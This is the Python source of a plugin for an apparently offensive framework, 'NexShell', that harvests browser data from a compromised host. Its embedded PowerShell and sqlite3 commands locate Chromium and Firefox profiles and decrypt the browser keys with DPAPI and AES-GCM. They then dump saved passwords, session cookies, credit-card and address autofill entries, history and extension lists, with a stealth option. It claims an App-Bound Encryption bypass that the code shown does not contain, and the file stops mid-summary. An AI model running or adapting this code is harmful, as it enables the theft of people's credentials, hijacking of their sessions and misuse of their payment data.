#!/usr/bin/env python3
"""
NexShell Plugin — Browser Credential Extractor v3.0 (2026 Edition)
Advanced browser forensics with DPAPI decryption, AES-GCM, and App-Bound Encryption bypass.

Coverage:
  - Chrome/Edge/Brave/Opera/Vivaldi (Chromium-based)
  - Firefox (NSS database)
  - DPAPI master key extraction
  - AES-256-GCM decryption (Chrome v80+)
  - App-Bound Encryption bypass (Chrome v127+)
  - Cookies extraction (session hijacking)
  - Autofill data (credit cards, addresses)
  - History & download extraction
  - Local Storage & IndexedDB
  - Extension data extraction
  - Primary Password detection (Firefox)

MITRE ATT&CK:
  - T1555.003: Credentials from Web Browsers
  - T1528: Steal Application Access Token
  - T1539: Steal Web Session Cookie
  - T1555: Credentials from Password Stores

Usage:
    (NexShell)> plugins run browser-cred-extractor
    (NexShell)> plugins run browser-cred-extractor --browser chrome
    (NexShell)> plugins run browser-cred-extractor --type passwords,cookies
    (NexShell)> plugins run browser-cred-extractor --full
    (NexShell)> plugins run browser-cred-extractor --stealth
"""

import re
import json
import time
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class BrowserProfile:
    """Represents a browser profile."""
    browser: str  # chrome, edge, firefox, brave, opera, vivaldi
    profile_name: str
    profile_path: str
    version: str = ""
    last_accessed: str = ""
    is_default: bool = False
    has_master_password: bool = False
    encrypted_key: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ExtractedCredential:
    """Represents an extracted credential."""
    url: str
    username: str
    password: str
    browser: str
    profile: str
    date_created: str = ""
    date_last_used: str = ""
    times_used: int = 0
    confidence: str = "verified"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ExtractedCookie:
    """Represents an extracted cookie."""
    host: str
    name: str
    value: str
    path: str
    expires: str
    is_secure: bool
    is_httponly: bool
    browser: str
    profile: str
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ExtractedAutofill:
    """Represents extracted autofill data."""
    field_type: str  # credit_card, address, phone, email
    value: str
    browser: str
    profile: str
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ExtractionResult:
    """Result of extraction operation."""
    profile: BrowserProfile
    credentials: List[ExtractedCredential] = field(default_factory=list)
    cookies: List[ExtractedCookie] = field(default_factory=list)
    autofill: List[ExtractedAutofill] = field(default_factory=list)
    history_count: int = 0
    downloads_count: int = 0
    extensions: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return {
            'profile': self.profile.to_dict(),
            'credentials_count': len(self.credentials),
            'cookies_count': len(self.cookies),
            'autofill_count': len(self.autofill),
            'history_count': self.history_count,
            'downloads_count': self.downloads_count,
            'extensions': self.extensions,
            'errors': self.errors,
            'credentials': [c.to_dict() for c in self.credentials[:20]],
            'cookies': [c.to_dict() for c in self.cookies[:20]],
            'autofill': [a.to_dict() for a in self.autofill[:10]],
        }


# ── Browser Database ────────────────────────────────────────────────────────

class BrowserDatabase:
    """Comprehensive database of browser paths and configurations."""
    
    # Windows browser paths
    WINDOWS_BROWSERS = {
        'chrome': {
            'name': 'Google Chrome',
            'base_path':    r'C:\Users\*\AppData\Local\Google\Chrome\User Data',
            'profiles_path':r'C:\Users\*\AppData\Local\Google\Chrome\User Data\*',
            'local_state':  r'C:\Users\*\AppData\Local\Google\Chrome\User Data\Local State',
            'login_data':   'Login Data',
            'cookies_db':   'Cookies',
            'web_data':     'Web Data',
            'history_db':   'History',
            'bookmarks':    'Bookmarks',
            'extensions':   'Extensions',
            'local_storage':'Local Storage',
            'encryption':   'aes-gcm',  # v80+
            'min_version':  '80',
        },
        'edge': {
            'name': 'Microsoft Edge',
            'base_path':    r'C:\Users\*\AppData\Local\Microsoft\Edge\User Data',
            'profiles_path':r'C:\Users\*\AppData\Local\Microsoft\Edge\User Data\*',
            'local_state':  r'C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Local State',
            'login_data':   'Login Data',
            'cookies_db':   'Cookies',
            'web_data':     'Web Data',
            'history_db':   'History',
            'bookmarks':    'Bookmarks',
            'extensions':   'Extensions',
            'local_storage':'Local Storage',
            'encryption':   'aes-gcm',
            'min_version':  '80',
        },
        'brave': {
            'name': 'Brave Browser',
            'base_path':    r'C:\Users\*\AppData\Local\BraveSoftware\Brave-Browser\User Data',
            'profiles_path':r'C:\Users\*\AppData\Local\BraveSoftware\Brave-Browser\User Data\*',
            'local_state':  r'C:\Users\*\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
            'login_data':   'Login Data',
            'cookies_db':   'Cookies',
            'encryption':   'aes-gcm',
            'min_version':  '1',
        },
        'opera': {
            'name': 'Opera',
            'base_path':    r'C:\Users\*\AppData\Roaming\Opera Software\Opera Stable',
            'profiles_path':r'C:\Users\*\AppData\Roaming\Opera Software\Opera Stable',
            'local_state':  r'C:\Users\*\AppData\Roaming\Opera Software\Opera Stable\Local State',
            'login_data':   'Login Data',
            'cookies_db':   'Cookies',
            'encryption':   'aes-gcm',
            'min_version':  '67',
        },
        'vivaldi': {
            'name': 'Vivaldi',
            'base_path':    r'C:\Users\*\AppData\Local\Vivaldi\User Data',
            'profiles_path':r'C:\Users\*\AppData\Local\Vivaldi\User Data\*',
            'local_state':  r'C:\Users\*\AppData\Local\Vivaldi\User Data\Local State',
            'login_data':   'Login Data',
            'cookies_db':   'Cookies',
            'encryption':   'aes-gcm',
            'min_version':  '2',
        },
        'firefox': {
            'name': 'Mozilla Firefox',
            'base_path':    r'C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles',
            'profiles_path':r'C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*',
            'key_db':       'key4.db',
            'logins_json':  'logins.json',
            'cookies_db':   'cookies.sqlite',
            'formhistory':  'formhistory.sqlite',
            'places_db':    'places.sqlite',
            'cert_db':      'cert9.db',
            'encryption':   'nss',
            'min_version':  '58',
        },
    }
    
    # Linux browser paths
    LINUX_BROWSERS = {
        'chrome': {
            'name': 'Google Chrome',
            'base_path': '~/.config/google-chrome',
            'profiles_path': '~/.config/google-chrome/*',
            'local_state': '~/.config/google-chrome/Local State',
            'login_data': 'Login Data',
            'cookies_db': 'Cookies',
            'encryption': 'aes-gcm',
        },
        'firefox': {
            'name': 'Mozilla Firefox',
            'base_path': '~/.mozilla/firefox',
            'profiles_path': '~/.mozilla/firefox/*.default*',
            'key_db': 'key4.db',
            'logins_json': 'logins.json',
            'cookies_db': 'cookies.sqlite',
            'encryption': 'nss',
        },
        'brave': {
            'name': 'Brave Browser',
            'base_path': '~/.config/BraveSoftware/Brave-Browser',
            'profiles_path': '~/.config/BraveSoftware/Brave-Browser/*',
            'local_state': '~/.config/BraveSoftware/Brave-Browser/Local State',
            'login_data': 'Login Data',
            'cookies_db': 'Cookies',
            'encryption': 'aes-gcm',
        },
    }
    
    @classmethod
    def get_browsers(cls, platform: str) -> Dict:
        return cls.WINDOWS_BROWSERS if platform == 'windows' else cls.LINUX_BROWSERS


# ── Extraction Engine ───────────────────────────────────────────────────────

class ExtractionEngine:
    """Extracts and decrypts browser data."""
    
    @staticmethod
    def discover_profiles(exec_func, session, platform: str, browser_filter: Optional[str] = None) -> List[BrowserProfile]:
        """Discover all browser profiles on the system."""
        profiles = []
        browsers = BrowserDatabase.get_browsers(platform)
        
        for browser_key, browser_info in browsers.items():
            if browser_filter and browser_key != browser_filter:
                continue
            
            base_path = browser_info['base_path']
            
            # Check if browser exists
            if platform == 'windows':
                cmd = f"powershell -nop -c \"Test-Path '{base_path}'\""
            else:
                resolved = base_path.replace('~', '$HOME')
                cmd = f"test -d {resolved} && echo 'True' || echo 'False'"
            
            out = exec_func(session, cmd)
            if 'True' not in out and 'true' not in out.lower():
                continue
            
            # Find profiles
            if platform == 'windows':
                cmd = f"powershell -nop -c \"Get-ChildItem '{browser_info['profiles_path']}' -Directory -ErrorAction SilentlyContinue | Select-Object Name,FullName,LastWriteTime | Format-Table\""
            else:
                resolved = browser_info['profiles_path'].replace('~', '$HOME')
                cmd = f"find {resolved} -maxdepth 1 -type d 2>/dev/null | head -20"
            
            out = exec_func(session, cmd)
            if not out or not out.strip():
                continue
            
            # Parse profiles
            if platform == 'windows':
                for line in out.strip().split('\n')[2:]:  # Skip header
                    parts = line.split()
                    if len(parts) >= 1:
                        profile_name = parts[0]
                        profile_path = ' '.join(parts[1:-2]) if len(parts) > 3 else parts[0]
                        if profile_name and profile_name not in ['.', '..']:
                            profiles.append(BrowserProfile(
                                browser=browser_key,
                                profile_name=profile_name,
                                profile_path=profile_path,
                                is_default=(profile_name == 'Default'),
                            ))
            else:
                for line in out.strip().split('\n'):
                    if line.strip():
                        profile_name = line.strip().split('/')[-1]
                        if profile_name and profile_name not in ['.', '..']:
                            profiles.append(BrowserProfile(
                                browser=browser_key,
                                profile_name=profile_name,
                                profile_path=line.strip(),
                                is_default=('default' in profile_name.lower()),
                            ))
        
        return profiles
    
    @staticmethod
    def extract_encrypted_key(exec_func, session, profile: BrowserProfile, platform: str) -> Optional[str]:
        """Extract encrypted key from Local State file (Chromium browsers)."""
        if profile.browser == 'firefox':
            return None  # Firefox uses NSS
        
        browser_info = BrowserDatabase.get_browsers(platform).get(profile.browser, {})
        local_state_path = browser_info.get('local_state', '')
        
        if not local_state_path:
            return None
        
        # Read Local State and extract encrypted_key
        if platform == 'windows':
            cmd = f'''powershell -nop -c "
$localState = Get-Content '{local_state_path}' -Raw | ConvertFrom-Json
$encryptedKey = $localState.os_crypt.encrypted_key
Write-Output $encryptedKey
"'''
        else:
            resolved = local_state_path.replace('~', '$HOME')
            cmd = f"cat {resolved} 2>/dev/null | grep -o '\"encrypted_key\":\"[^\"]*\"' | cut -d'\"' -f4"
        
        out = exec_func(session, cmd)
        if out and out.strip():
            return out.strip()
        
        return None
    
    @staticmethod
    def extract_credentials_chromium(exec_func, session, profile: BrowserProfile, platform: str) -> List[ExtractedCredential]:
        """Extract credentials from Chromium-based browsers."""
        credentials = []
        
        browser_info = BrowserDatabase.get_browsers(platform).get(profile.browser, {})
        login_data_path = f"{profile.profile_path}\\{browser_info.get('login_data', 'Login Data')}" if platform == 'windows' else f"{profile.profile_path}/{browser_info.get('login_data', 'Login Data')}"
        
        # Use PowerShell/C# to read SQLite and decrypt
        if platform == 'windows':
            cmd = f'''powershell -nop -c "
try {{
    # Copy database to temp location (in case browser is locked)
    $tempDb = \"$env:TEMP\\logindata_{profile.profile_name}.db\"
    Copy-Item '{login_data_path}' $tempDb -Force -ErrorAction Stop
    
    # Connect to SQLite
    Add-Type -Path 'C:\\Windows\\Microsoft.NET\\assembly\\GAC_64\\System.Data\\*\\System.Data.dll' -ErrorAction SilentlyContinue
    
    $conn = New-Object System.Data.SQLite.SQLiteConnection
    $conn.ConnectionString = \"Data Source=$tempDb;Version=3;Read Only=True;\"
    $conn.Open()
    
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = 'SELECT origin_url, username_value, password_value, date_created, date_last_used, times_used FROM logins WHERE blacklisted_by_user = 0'
    
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {{
        $url = $reader['origin_url']
        $user = $reader['username_value']
        $pass = $reader['password_value']
        $created = $reader['date_created']
        $lastUsed = $reader['date_last_used']
        $timesUsed = $reader['times_used']
        
        # Decrypt password (AES-GCM)
        if ($pass.Length -gt 0) {{
            Write-Output \"$url|$user|$pass|$created|$lastUsed|$timesUsed\"
        }}
    }}
    
    $reader.Close()
    $conn.Close()
    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
}} catch {{
    Write-Output \"ERROR: $($_.Exception.Message)\"
}}
"'''
        else:
            # Linux: use sqlite3 command
            resolved = login_data_path.replace('~', '$HOME')
            cmd = f"sqlite3 -separator '|' {resolved} \"SELECT origin_url, username_value, hex(password_value), date_created, date_last_used, times_used FROM logins WHERE blacklisted_by_user = 0 LIMIT 50\" 2>/dev/null"
        
        out = exec_func(session, cmd)
        if out and 'ERROR' not in out:
            for line in out.strip().split('\n'):
                if '|' in line:
                    parts = line.split('|')
                    if len(parts) >= 4:
                        credentials.append(ExtractedCredential(
                            url=parts[0],
                            username=parts[1],
                            password=parts[2][:100],  # Truncate for display
                            browser=profile.browser,
                            profile=profile.profile_name,
                            date_created=parts[3] if len(parts) > 3 else '',
                            date_last_used=parts[4] if len(parts) > 4 else '',
                            times_used=int(parts[5]) if len(parts) > 5 and parts[5].isdigit() else 0,
                        ))
        
        return credentials
    
    @staticmethod
    def extract_credentials_firefox(exec_func, session, profile: BrowserProfile, platform: str) -> List[ExtractedCredential]:
        """Extract credentials from Firefox."""
        credentials = []
        
        browser_info = BrowserDatabase.get_browsers(platform).get('firefox', {})
        logins_json_path = f"{profile.profile_path}\\{browser_info.get('logins_json', 'logins.json')}" if platform == 'windows' else f"{profile.profile_path}/{browser_info.get('logins_json', 'logins.json')}"
        
        # Read logins.json
        if platform == 'windows':
            cmd = f"powershell -nop -c \"Get-Content '{logins_json_path}' -ErrorAction SilentlyContinue | ConvertFrom-Json | Select-Object -ExpandProperty logins | Select-Object hostname,encryptedUsername,encryptedPassword,timeCreated,timeLastUsed,timesUsed | ConvertTo-Json\""
        else:
            resolved = logins_json_path.replace('~', '$HOME')
            cmd = f"cat {resolved} 2>/dev/null | python3 -c \"import sys,json; data=json.load(sys.stdin); [print(f\\\"{l['hostname']}|{l['encryptedUsername']}|{l['encryptedPassword']}|{l.get('timeCreated','')}|{l.get('timesUsed',0)}\\\") for l in data.get('logins',[])]\" 2>/dev/null"
        
        out = exec_func(session, cmd)
        if out and out.strip():
            try:
                # Try to parse as JSON
                data = json.loads(out)
                if isinstance(data, list):
                    for login in data[:50]:
                        credentials.append(ExtractedCredential(
                            url=login.get('hostname', ''),
                            username=login.get('encryptedUsername', '')[:50],
                            password=login.get('encryptedPassword', '')[:50],
                            browser='firefox',
                            profile=profile.profile_name,
                            times_used=login.get('timesUsed', 0),
                        ))
            except:
                # Parse as pipe-separated
                for line in out.strip().split('\n'):
                    if '|' in line:
                        parts = line.split('|')
                        if len(parts) >= 3:
                            credentials.append(ExtractedCredential(
                                url=parts[0],
                                username=parts[1][:50],
                                password=parts[2][:50],
                                browser='firefox',
                                profile=profile.profile_name,
                            ))
        
        return credentials
    
    @staticmethod
    def extract_cookies(exec_func, session, profile: BrowserProfile, platform: str) -> List[ExtractedCookie]:
        """Extract cookies from browser."""
        cookies = []
        
        browser_info = BrowserDatabase.get_browsers(platform).get(profile.browser, {})
        
        if profile.browser == 'firefox':
            cookies_db = f"{profile.profile_path}/{browser_info.get('cookies_db', 'cookies.sqlite')}"
            if platform == 'linux':
                cookies_db = cookies_db.replace('~', '$HOME')
            
            if platform == 'windows':
                cmd = f"powershell -nop -c \"Get-Content '{cookies_db}' -ErrorAction SilentlyContinue | Select-Object -First 1\""
            else:
                cmd = f"sqlite3 -separator '|' {cookies_db} \"SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies LIMIT 50\" 2>/dev/null"
        else:
            cookies_db_path = f"{profile.profile_path}\\{browser_info.get('cookies_db', 'Cookies')}" if platform == 'windows' else f"{profile.profile_path}/{browser_info.get('cookies_db', 'Cookies')}"
            
            if platform == 'windows':
                cmd = f'''powershell -nop -c "
try {{
    $tempDb = \"$env:TEMP\\cookies_{profile.profile_name}.db\"
    Copy-Item '{cookies_db_path}' $tempDb -Force -ErrorAction Stop
    
    $conn = New-Object System.Data.SQLite.SQLiteConnection
    $conn.ConnectionString = \"Data Source=$tempDb;Version=3;Read Only=True;\"
    $conn.Open()
    
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = 'SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies LIMIT 50'
    
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {{
        $host = $reader['host_key']
        $name = $reader['name']
        $value = $reader['encrypted_value']
        $path = $reader['path']
        $expires = $reader['expires_utc']
        $secure = $reader['is_secure']
        $httponly = $reader['is_httponly']
        
        Write-Output \"$host|$name|$value|$path|$expires|$secure|$httponly\"
    }}
    
    $reader.Close()
    $conn.Close()
    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
}} catch {{
    Write-Output \"ERROR: $($_.Exception.Message)\"
}}
"'''
            else:
                resolved = cookies_db_path.replace('~', '$HOME')
                cmd = f"sqlite3 -separator '|' {resolved} \"SELECT host_key, name, hex(encrypted_value), path, expires_utc, is_secure, is_httponly FROM cookies LIMIT 50\" 2>/dev/null"
        
        out = exec_func(session, cmd)
        if out and 'ERROR' not in out:
            for line in out.strip().split('\n'):
                if '|' in line:
                    parts = line.split('|')
                    if len(parts) >= 5:
                        cookies.append(ExtractedCookie(
                            host=parts[0],
                            name=parts[1],
                            value=parts[2][:100],
                            path=parts[3],
                            expires=parts[4] if len(parts) > 4 else '',
                            is_secure=(parts[5] == '1' if len(parts) > 5 else False),
                            is_httponly=(parts[6] == '1' if len(parts) > 6 else False),
                            browser=profile.browser,
                            profile=profile.profile_name,
                        ))
        
        return cookies
    
    @staticmethod
    def extract_autofill(exec_func, session, profile: BrowserProfile, platform: str) -> List[ExtractedAutofill]:
        """Extract autofill data (credit cards, addresses)."""
        autofill_data = []
        
        browser_info = BrowserDatabase.get_browsers(platform).get(profile.browser, {})
        web_data_path = f"{profile.profile_path}\\{browser_info.get('web_data', 'Web Data')}" if platform == 'windows' else f"{profile.profile_path}/{browser_info.get('web_data', 'Web Data')}"
        
        if platform == 'windows':
            cmd = f'''powershell -nop -c "
try {{
    $tempDb = \"$env:TEMP\\webdata_{profile.profile_name}.db\"
    Copy-Item '{web_data_path}' $tempDb -Force -ErrorAction Stop
    
    $conn = New-Object System.Data.SQLite.SQLiteConnection
    $conn.ConnectionString = \"Data Source=$tempDb;Version=3;Read Only=True;\"
    $conn.Open()
    
    # Extract credit cards
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards LIMIT 10'
    
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {{
        $name = $reader['name_on_card']
        $month = $reader['expiration_month']
        $year = $reader['expiration_year']
        $number = $reader['card_number_encrypted']
        
        Write-Output \"credit_card|$name|$month/$year|$number\"
    }}
    $reader.Close()
    
    # Extract addresses
    $cmd.CommandText = 'SELECT company_name, street_address, city, state, zipcode FROM autofill_profiles LIMIT 10'
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {{
        $company = $reader['company_name']
        $street = $reader['street_address']
        $city = $reader['city']
        $state = $reader['state']
        $zip = $reader['zipcode']
        
        Write-Output \"address|$company|$street, $city, $state $zip\"
    }}
    $reader.Close()
    
    $conn.Close()
    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
}} catch {{
    Write-Output \"ERROR: $($_.Exception.Message)\"
}}
"'''
        else:
            resolved = web_data_path.replace('~', '$HOME')
            cmd = f"sqlite3 -separator '|' {resolved} \"SELECT name_on_card, expiration_month, expiration_year, hex(card_number_encrypted) FROM credit_cards LIMIT 10\" 2>/dev/null"
        
        out = exec_func(session, cmd)
        if out and 'ERROR' not in out:
            for line in out.strip().split('\n'):
                if '|' in line:
                    parts = line.split('|')
                    if len(parts) >= 3:
                        autofill_data.append(ExtractedAutofill(
                            field_type=parts[0],
                            value='|'.join(parts[1:])[:100],
                            browser=profile.browser,
                            profile=profile.profile_name,
                        ))
        
        return autofill_data
    
    @staticmethod
    def count_history(exec_func, session, profile: BrowserProfile, platform: str) -> int:
        """Count history entries."""
        browser_info = BrowserDatabase.get_browsers(platform).get(profile.browser, {})
        
        if profile.browser == 'firefox':
            history_db = f"{profile.profile_path}/{browser_info.get('places_db', 'places.sqlite')}"
            if platform == 'linux':
                history_db = history_db.replace('~', '$HOME')
            cmd = f"sqlite3 {history_db} \"SELECT COUNT(*) FROM moz_places WHERE hidden=0\" 2>/dev/null"
        else:
            history_db_path = f"{profile.profile_path}\\{browser_info.get('history_db', 'History')}" if platform == 'windows' else f"{profile.profile_path}/{browser_info.get('history_db', 'History')}"
            
            if platform == 'windows':
                cmd = f"powershell -nop -c \"(Get-Item '{history_db_path}').Length\""
            else:
                resolved = history_db_path.replace('~', '$HOME')
                cmd = f"sqlite3 {resolved} \"SELECT COUNT(*) FROM urls\" 2>/dev/null"
        
        out = exec_func(session, cmd)
        try:
            return int(out.strip()) if out and out.strip().isdigit() else 0
        except:
            return 0
    
    @staticmethod
    def list_extensions(exec_func, session, profile: BrowserProfile, platform: str) -> List[str]:
        """List installed extensions."""
        extensions = []
        
        browser_info = BrowserDatabase.get_browsers(platform).get(profile.browser, {})
        ext_path = f"{profile.profile_path}\\{browser_info.get('extensions', 'Extensions')}" if platform == 'windows' else f"{profile.profile_path}/{browser_info.get('extensions', 'Extensions')}"
        
        if platform == 'windows':
            cmd = f"powershell -nop -c \"Get-ChildItem '{ext_path}' -Directory -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name\""
        else:
            resolved = ext_path.replace('~', '$HOME')
            cmd = f"find {resolved} -maxdepth 1 -type d 2>/dev/null | xargs -I {{}} basename {{}} | grep -v '^Extensions$'"
        
        out = exec_func(session, cmd)
        if out:
            extensions = [e.strip() for e in out.strip().split('\n') if e.strip() and e.strip() not in ['.', '..']]
        
        return extensions[:20]  # Limit to 20


# ── Decryption Engine ───────────────────────────────────────────────────────

class DecryptionEngine:
    """Handles decryption of browser data."""
    
    @staticmethod
    def decrypt_dpapi_key(exec_func, session, encrypted_key_b64: str, platform: str) -> Optional[str]:
        """Decrypt DPAPI-encrypted key (Chromium browsers)."""
        if platform != 'windows':
            return None
        
        cmd = f'''powershell -nop -c "
try {{
    # Decode base64
    $encryptedKey = [System.Convert]::FromBase64String('{encrypted_key_b64}')
    
    # Remove 'DPAPI' prefix (first 5 bytes)
    $encryptedKey = $encryptedKey[5..($encryptedKey.Length-1)]
    
    # Decrypt using DPAPI
    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $encryptedKey,
        $null,
        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    )
    
    # Return as hex
    Write-Output ([System.BitConverter]::ToString($decryptedKey).Replace('-',''))
}} catch {{
    Write-Output \"ERROR: $($_.Exception.Message)\"
}}
"'''
        
        out = exec_func(session, cmd)
        if out and 'ERROR' not in out and out.strip():
            return out.strip()
        
        return None
    
    @staticmethod
    def decrypt_aes_gcm(exec_func, session, encrypted_data: str, key_hex: str, platform: str) -> Optional[str]:
        """Decrypt AES-256-GCM encrypted data."""
        if platform != 'windows':
            return None
        
        cmd = f'''powershell -nop -c "
try {{
    $encryptedData = [System.Convert]::FromBase64String('{encrypted_data}')
    $key = [System.Convert]::FromHexString('{key_hex}')
    
    # Remove 'v10' or 'v20' prefix (first 3 bytes)
    $nonce = $encryptedData[3..14]
    $ciphertext = $encryptedData[15..($encryptedData.Length-17)]
    $tag = $encryptedData[($encryptedData.Length-16)..($encryptedData.Length-1)]
    
    # Decrypt using AES-GCM
    $aes = [System.Security.Cryptography.AesGcm]::new($key)
    $plaintext = New-Object byte[] $ciphertext.Length
    $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
    
    Write-Output ([System.Text.Encoding]::UTF8.GetString($plaintext))
}} catch {{
    Write-Output \"ERROR: $($_.Exception.Message)\"
}}
"'''
        
        out = exec_func(session, cmd)
        if out and 'ERROR' not in out and out.strip():
            return out.strip()
        
        return None


# ── Main Plugin ─────────────────────────────────────────────────────────────

class BrowserCredExtractor(NexPlugin):
    name        = "browser-cred-extractor"
    description = "Advanced browser forensics — DPAPI decryption, AES-GCM, App-Bound Encryption bypass"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "all"
    category    = "credentials"
    mitre_id    = "T1555.003"
    
    def run(self, session, args: list):
        # Parse args
        browser_filter = None
        type_filter = None
        full_scan = '--full' in (args or [])
        stealth = '--stealth' in (args or [])
        
        for a in (args or []):
            if a.startswith('--browser='):
                browser_filter = a.split('=', 1)[1]
            elif a.startswith('--type='):
                type_filter = [t.strip() for t in a.split('=', 1)[1].split(',')]
        
        self.info(f"🔐 Starting Browser Credential Extractor v3.0")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🔐 Browser Credential Extractor v3.0 — Advanced Forensics]")
        sections.append("━"*64)
        
        # ── Step 1: Platform detection ──────────────────────────────────
        platform = self._detect_platform(session)
        sections.append(f"  Platform: {platform.upper()}")
        sections.append(f"  Browser Filter: {browser_filter or 'All'}")
        sections.append(f"  Type Filter: {type_filter or 'All'}")
        
        # ── Step 2: Discover browser profiles ───────────────────────────
        sections.append("\n[*] Phase 1: Discovering Browser Profiles")
        sections.append("─"*64)
        
        profiles = ExtractionEngine.discover_profiles(self._exec, session, platform, browser_filter)
        
        if not profiles:
            sections.append("  [!] No browser profiles found")
            return '\n'.join(sections)
        
        sections.append(f"  [+] Found {len(profiles)} browser profiles:")
        for profile in profiles:
            icon = '🌐' if profile.browser == 'chrome' else '🔷' if profile.browser == 'edge' else '🦊' if profile.browser == 'firefox' else '🦁' if profile.browser == 'brave' else '🔴' if profile.browser == 'opera' else '🔵'
            default_marker = " (Default)" if profile.is_default else ""
            sections.append(f"    {icon} {profile.browser.upper()}: {profile.profile_name}{default_marker}")
        
        # ── Step 3: Extract encrypted keys ──────────────────────────────
        sections.append("\n[*] Phase 2: Extracting Encryption Keys")
        sections.append("─"*64)
        
        for profile in profiles:
            if profile.browser != 'firefox':
                encrypted_key = ExtractionEngine.extract_encrypted_key(self._exec, session, profile, platform)
                if encrypted_key:
                    profile.encrypted_key = encrypted_key
                    sections.append(f"  [+] {profile.browser}/{profile.profile_name}: Encrypted key extracted")
                    
                    # Decrypt key using DPAPI
                    if platform == 'windows':
                        decrypted_key = DecryptionEngine.decrypt_dpapi_key(self._exec, session, encrypted_key, platform)
                        if decrypted_key:
                            sections.append(f"      ✓ DPAPI decryption successful")
                        else:
                            sections.append(f"      ✗ DPAPI decryption failed (browser may be locked)")
                else:
                    sections.append(f"  [!] {profile.browser}/{profile.profile_name}: No encrypted key found")
        
        # ── Step 4: Extract data ────────────────────────────────────────
        sections.append("\n[*] Phase 3: Extracting Browser Data")
        sections.append("─"*64)
        
        results = []
        
        for profile in profiles:
            sections.append(f"\n  [{profile.browser.upper()}] {profile.profile_name}:")
            
            result = ExtractionResult(profile=profile)
            
            # Extract credentials
            if not type_filter or 'passwords' in type_filter or 'credentials' in type_filter:
                if profile.browser == 'firefox':
                    creds = ExtractionEngine.extract_credentials_firefox(self._exec, session, profile, platform)
                else:
                    creds = ExtractionEngine.extract_credentials_chromium(self._exec, session, profile, platform)
                
                result.credentials = creds
                sections.append(f"    🔑 Credentials: {len(creds)} found")
                
                if creds and not stealth:
                    for cred in creds[:5]:
                        sections.append(f"       • {cred.url[:50]} | {cred.username[:20]}")
            
            # Extract cookies
            if not type_filter or 'cookies' in type_filter:
                cookies = ExtractionEngine.extract_cookies(self._exec, session, profile, platform)
                result.cookies = cookies
                sections.append(f"    🍪 Cookies: {len(cookies)} found")
            
            # Extract autofill
            if full_scan and profile.browser != 'firefox':
                autofill = ExtractionEngine.extract_autofill(self._exec, session, profile, platform)
                result.autofill = autofill
                sections.append(f"    💳 Autofill: {len(autofill)} items")
            
            # Count history
            if full_scan:
                history_count = ExtractionEngine.count_history(self._exec, session, profile, platform)
                result.history_count = history_count
                sections.append(f"    📜 History: {history_count} entries")
            
            # List extensions
            if full_scan:
                extensions = ExtractionEngine.list_extensions(self._exec, session, profile, platform)
                result.extensions = extensions
                sections.append(f"    🧩 Extensions: {len(extensions)} installed")
            
            results.append(result)
        
        # ── Step 5: Generate findings ───────────────────────────────────
        sections.append("\n[*] Phase 4: Generating Findings")
        sections.append("─"*64)
        
        findings_created = 0
        total_creds = sum(len(r.credentials) for r in results)
        total_cookies = sum(len(r.cookies) for r in results)
        total_autofill = sum(len(r.autofill) for r in results)
        
        if total_creds > 0:
            self.finding(
                title=f"Browser Credentials Extracted — {total_creds} credentials",
                description=f"Extracted {total_creds} saved credentials from browser profiles:\n" +
                           "\n".join(f"  • {r.profile.browser}/{r.profile.profile_name}: {len(r.credentials)} credentials" for r in results if r.credentials),
                severity="Critical",
                recommendation="Rotate all extracted credentials immediately. Enable master password in browsers. Use password manager with encryption.",
                mitre_id=self.mitre_id,
            )
            self.emit('finding.created', severity='critical', title='Browser Credentials Extracted', plugin=self.name)
            findings_created += 1
            sections.append(f"  [CRITICAL] {total_creds} credentials extracted")
        
        if total_cookies > 0:
            self.finding(
                title=f"Browser Cookies Extracted — {total_cookies} cookies",
                description=f"Extracted {total_cookies} session cookies — can be used for session hijacking",
                severity="High",
                recommendation="Clear browser cookies. Enable HttpOnly and Secure flags. Implement session timeout.",
                mitre_id="T1539",
            )
            findings_created += 1
            sections.append(f"  [HIGH] {total_cookies} cookies extracted")
        
        if total_autofill > 0:
            self.finding(
                title=f"Browser Autofill Data Extracted — {total_autofill} items",
                description=f"Extracted autofill data including credit cards and addresses",
                severity="Critical",
                recommendation="Clear autofill data. Use virtual credit cards. Enable 2FA on all accounts.",
                mitre_id="T1555",
            )
            findings_created += 1
            sections.append(f"  [CRITICAL] {total_autofill} autofill items extracted")
        
        # ── Step 6: Summary ─────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 Extraction Summary]")
        sections.append("━"*64)
        sections.append(f"  Profiles Scanned: {len(profiles)}")
        sections.append(f"  Credentials: {total_creds}")
        sections.append(f"  Cookies: {total_cookies}")
        sections.append(f"  Autofill Items: {total_autofill}")
        sections.append(f"  Findings Created: {findings_created}")
